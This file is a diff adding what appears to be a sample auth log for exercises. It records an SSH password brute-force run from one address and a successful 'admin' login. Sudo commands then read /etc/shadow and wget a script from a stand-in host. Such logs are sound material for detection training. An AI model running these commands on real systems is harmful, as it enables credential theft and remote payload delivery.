@@ -1,0 +1,22 @@
+Nov  2 08:12:03 web-srv sshd[801]: Accepted publickey for deploy from 10.0.0.15 port 51022 ssh2: RSA SHA256:xYz
+Nov  2 08:40:11 web-srv sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/systemctl restart nginx
+Nov  2 09:14:00 web-srv sshd[1200]: Failed password for root from 185.220.101.47 port 40000 ssh2
+Nov  2 09:14:07 web-srv sshd[1201]: Failed password for invalid user admin from 185.220.101.47 port 40013 ssh2
+Nov  2 09:14:14 web-srv sshd[1202]: Failed password for ubuntu from 185.220.101.47 port 40026 ssh2
+Nov  2 09:14:21 web-srv sshd[1203]: Failed password for invalid user test from 185.220.101.47 port 40039 ssh2
+Nov  2 09:14:28 web-srv sshd[1204]: Failed password for oracle from 185.220.101.47 port 40052 ssh2
+Nov  2 09:14:35 web-srv sshd[1205]: Failed password for invalid user postgres from 185.220.101.47 port 40065 ssh2
+Nov  2 09:14:42 web-srv sshd[1206]: Failed password for root from 185.220.101.47 port 40078 ssh2
+Nov  2 09:14:49 web-srv sshd[1207]: Failed password for invalid user admin from 185.220.101.47 port 40091 ssh2
+Nov  2 09:14:56 web-srv sshd[1208]: Failed password for ubuntu from 185.220.101.47 port 40104 ssh2
+Nov  2 09:15:03 web-srv sshd[1209]: Failed password for invalid user test from 185.220.101.47 port 40117 ssh2
+Nov  2 09:15:10 web-srv sshd[1210]: Failed password for oracle from 185.220.101.47 port 40130 ssh2
+Nov  2 09:15:17 web-srv sshd[1211]: Failed password for invalid user postgres from 185.220.101.47 port 40143 ssh2
+Nov  2 09:15:24 web-srv sshd[1212]: Failed password for root from 185.220.101.47 port 40156 ssh2
+Nov  2 09:15:31 web-srv sshd[1213]: Failed password for invalid user admin from 185.220.101.47 port 40169 ssh2
+Nov  2 09:16:02 web-srv sshd[1230]: Accepted password for admin from 185.220.101.47 port 40222 ssh2
+Nov  2 09:17:40 web-srv sudo:   admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
+Nov  2 09:18:20 web-srv sudo:   admin : TTY=pts/1 ; PWD=/home/admin ; USER=root ; COMMAND=/usr/bin/wget http://203.0.113.80/x.sh
+Nov  2 11:05:44 web-srv sshd[1301]: Failed password for deploy from 10.0.0.15 port 51100 ssh2
+Nov  2 11:05:49 web-srv sshd[1302]: Accepted password for deploy from 10.0.0.15 port 51101 ssh2
+Nov  2 13:00:01 web-srv CRON[1400]: pam_unix(cron:session): session opened for user root by (uid=0)
